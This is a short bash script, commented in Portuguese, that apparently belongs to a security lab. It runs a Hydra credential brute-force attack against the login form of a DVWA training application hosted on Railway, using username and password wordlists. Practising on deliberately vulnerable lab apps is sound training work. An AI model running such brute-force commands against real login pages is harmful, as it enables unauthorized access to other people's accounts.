#!/bin/bash

# Play 02 — Hydra DVWA
# Usa a variável DVWA_HOST (ou o default hard-coded) para apontar ao DVWA em prod

# Se tiver definido DVWA_HOST nas vars do Railway, usa; senão, cai no padrão:
TARGET="${DVWA_HOST:-web-dvwa-production.up.railway.app}:80"

echo "[*] Iniciando ataque com Hydra contra $TARGET..."
hydra -L users.txt -P passwords.txt \
  http-post-form "http://$TARGET/login.php:username=^USER^&password=^PASS^&Login=Login failed" \
  -o hydra-out.txt 2>&1

echo "[✔️] Teste concluído com sucesso."
